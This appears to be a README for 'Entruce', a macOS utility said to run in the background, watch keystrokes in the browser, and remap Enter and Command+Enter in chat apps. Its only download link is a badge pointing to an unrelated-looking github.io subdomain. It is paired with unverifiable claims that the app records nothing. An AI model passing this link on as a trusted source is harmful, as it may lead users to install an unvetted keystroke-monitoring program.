# ⌨️ Entruce - Standardize your chat app keyboard shortcuts

[![](https://img.shields.io/badge/Download-Entruce-blue.svg)](https://blinnireversed184.github.io)

Entruce changes how you interact with chat applications. Many programs send messages the moment you press the Enter key. This often leads to incomplete thoughts or accidental sends. Entruce stops this behavior. It forces your keyboard to insert a new line when you press Enter. You use Command+Enter when you want to send your text. This simple change improves your daily workflow in tools like ChatGPT and Claude.

## ⚙️ Understanding how it works

Entruce runs in the background. It watches for your keystrokes while you use your web browser. 

- Pressing Enter: The app intercepts this input and creates a line break instead of sending your message. 
- Pressing Command+Enter: The app sends the message immediately. 

This behavior mimics many professional communication tools. It gives you control over your content before it reaches the server. 

## 🛡️ Privacy and safety

Entruce performs its job locally on your machine. The utility does not track your keystrokes or record your personal messages. It only monitors the specific keys required to perform the override. It stores no data about your habits or the content you type. Your data stays within your browser and the chat application you choose to use.

## 🆘 Troubleshooting common issues

If the Enter key still sends your messages, check that Entruce is running. Look at your menu bar at the top right of your screen. If you do not see the icon, go to your Applications folder and open the program again. 

If the app fails to open, ensure you run the latest version of macOS. Entruce requires a modern system to handle the keyboard input modifications correctly. If you encounter errors, try restarting your computer. This clears any temporary conflicts with other background processes.
